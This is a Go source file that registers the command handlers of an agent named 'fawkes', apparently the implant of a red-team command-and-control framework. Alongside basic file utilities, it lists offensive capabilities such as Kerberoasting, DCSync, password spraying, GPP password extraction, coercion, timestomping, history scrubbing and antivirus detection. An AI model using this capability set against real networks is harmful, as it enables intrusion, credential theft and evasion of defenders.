package commands

import (
	"log"
	"sync"

	"fawkes/pkg/structs"
)

var (
	commandRegistry = make(map[string]structs.Command)
	registryMutex   sync.RWMutex
)

// Initialize sets up all available commands
func Initialize() {
	log.Printf("[INFO] Initializing command handlers")

	// Register cross-platform commands
	RegisterCommand(&CatCommand{})
	RegisterCommand(&CdCommand{})
	RegisterCommand(&CpCommand{})
	RegisterCommand(&DownloadCommand{})
	RegisterCommand(&LsCommand{})
	RegisterCommand(&MkdirCommand{})
	RegisterCommand(&MvCommand{})
	RegisterCommand(&PsCommand{})
	RegisterCommand(&PwdCommand{})
	RegisterCommand(&RmCommand{})
	RegisterCommand(&RunCommand{})
	RegisterCommand(&SleepCommand{})
	RegisterCommand(&SocksCommand{})
	RegisterCommand(&UploadCommand{})
	RegisterCommand(&EnvCommand{})
	RegisterCommand(&ExitCommand{})
	RegisterCommand(&KillCommand{})
	RegisterCommand(&WhoamiCommand{})
	RegisterCommand(&IfconfigCommand{})
	RegisterCommand(&FindCommand{})
	RegisterCommand(&NetstatCommand{})
	RegisterCommand(&PortScanCommand{})
	RegisterCommand(&TimestompCommand{})
	RegisterCommand(&ArpCommand{})
	RegisterCommand(&SetenvCommand{})
	RegisterCommand(&AvDetectCommand{})
	RegisterCommand(&LinkCommand{})
	RegisterCommand(&UnlinkCommand{})
	RegisterCommand(&LdapQueryCommand{})
	RegisterCommand(&LdapWriteCommand{})
	RegisterCommand(&KerberoastCommand{})
	RegisterCommand(&AsrepCommand{})
	RegisterCommand(&SmbCommand{})
	RegisterCommand(&DnsCommand{})
	RegisterCommand(&WinrmCommand{})
	RegisterCommand(&AdcsCommand{})
	RegisterCommand(&KerbDelegationCommand{})
	RegisterCommand(&SshExecCommand{})
	RegisterCommand(&CurlCommand{})
	RegisterCommand(&RpfwdCommand{})
	RegisterCommand(&KlistCommand{})
	RegisterCommand(&SprayCommand{})
	RegisterCommand(&DomainPolicyCommand{})
	RegisterCommand(&GpoCommand{})
	RegisterCommand(&DcsyncCommand{})
	RegisterCommand(&TicketCommand{})
	RegisterCommand(&TrustCommand{})
	RegisterCommand(&NetGroupCommand{})
	RegisterCommand(&ModulesCommand{})
	RegisterCommand(&GrepCommand{})
	RegisterCommand(&CompressCommand{})
	RegisterCommand(&DriversCommand{})
	RegisterCommand(&RouteCommand{})
	RegisterCommand(&SysinfoCommand{})
	RegisterCommand(&LapsCommand{})
	RegisterCommand(&GppPasswordCommand{})
	RegisterCommand(&ConfigCommand{})
	RegisterCommand(&HistoryScrubCommand{})
	RegisterCommand(&CoerceCommand{})
	RegisterCommand(&FindAdminCommand{})
	RegisterCommand(&HashCommand{})
	RegisterCommand(&ChmodCommand{})
	RegisterCommand(&ChownCommand{})
	RegisterCommand(&StatCommand{})
	RegisterCommand(&TailCommand{})
	RegisterCommand(&WriteFileCommand{})
	RegisterCommand(&Base64Command{})
	RegisterCommand(&TouchCommand{})
	RegisterCommand(&HexdumpCommand{})
	RegisterCommand(&StringsCommand{})
	RegisterCommand(&SecureDeleteCommand{})
	RegisterCommand(&WcCommand{})
	RegisterCommand(&DuCommand{})
	RegisterCommand(&DiffCommand{})
	RegisterCommand(&DfCommand{})
	RegisterCommand(&MountCommand{})
	RegisterCommand(&SortCommand{})
	RegisterCommand(&UniqCommand{})
	RegisterCommand(&TacCommand{})
	RegisterCommand(&CutCommand{})
	RegisterCommand(&TrCommand{})
	RegisterCommand(&ProcessTreeCommand{})
	RegisterCommand(&WlanProfilesCommand{})
	RegisterCommand(&CloudMetadataCommand{})
	RegisterCommand(&EncryptCommand{})
	RegisterCommand(&ProxyCheckCommand{})
	RegisterCommand(&FileTypeCommand{})
	RegisterCommand(&LastCommand{})
	RegisterCommand(&PingCommand{})
	RegisterCommand(&UptimeCommand{})
	RegisterCommand(&WhoCommand{})

	// Register platform-specific commands
	registerPlatformCommands()

	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
}

// RegisterCommand registers a command with the command registry
func RegisterCommand(cmd structs.Command) {
	registryMutex.Lock()
	defer registryMutex.Unlock()

	commandRegistry[cmd.Name()] = cmd
	// log.Printf("[DEBUG] Registered command: %s", cmd.Name())
}

// GetCommand retrieves a command from the registry
func GetCommand(name string) structs.Command {
	registryMutex.RLock()
	defer registryMutex.RUnlock()

	return commandRegistry[name]
}

// GetAllCommands returns all registered commands
func GetAllCommands() map[string]structs.Command {
	registryMutex.RLock()
	defer registryMutex.RUnlock()

	commands := make(map[string]structs.Command)
	for name, cmd := range commandRegistry {
		commands[name] = cmd
	}

	return commands
}
